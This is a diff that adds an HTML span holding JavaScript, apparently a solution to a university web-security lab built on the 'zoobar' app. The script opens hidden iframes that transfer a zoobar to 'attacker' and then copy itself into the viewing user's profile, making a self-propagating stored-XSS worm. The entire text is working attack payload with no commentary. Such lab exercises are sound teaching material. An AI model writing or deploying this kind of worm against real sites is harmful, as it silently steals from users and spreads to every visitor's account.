@@ -1,0 +1,30 @@
+<span id='zoobars' class="
+
+var iframe = document.createElement('iframe');
+iframe.setAttribute('name', 'zoobar');
+iframe.setAttribute('src', 'http://zoobar.csl.toronto.edu/transfer.php');
+iframe.setAttribute('style', 'visibility:hidden');
+var e = function() { console.log('loaded!'); 
+     iframe.contentDocument.transfer_form.zoobars.value=1;
+iframe.contentDocument.transfer_form.zb_recipient.value='attacker';
+iframe.contentDocument.transfer_form.submission.click();
+iframe.removeEventListener('load', e);
+}
+iframe.addEventListener('load', e);
+document.body.appendChild(iframe);
+
+var iframe2 = document.createElement('iframe');
+iframe2.setAttribute('name', 'profile');
+iframe2.setAttribute('src', 'http://zoobar.csl.toronto.edu/index.php');
+iframe2.setAttribute('style', 'visibility:hidden');
+var f = function() { console.log('loaded!'); 
+iframe2.contentDocument.profile_form.profileupdate.innerHTML=document.getElementById('profile').innerHTML;
+iframe2.contentDocument.profile_form.profilesubmit.click();
+iframe2.removeEventListener('load', f);
+}
+iframe2.addEventListener('load', f);
+document.body.appendChild(iframe2);
+
+total = 10;
+
+">sup</span>
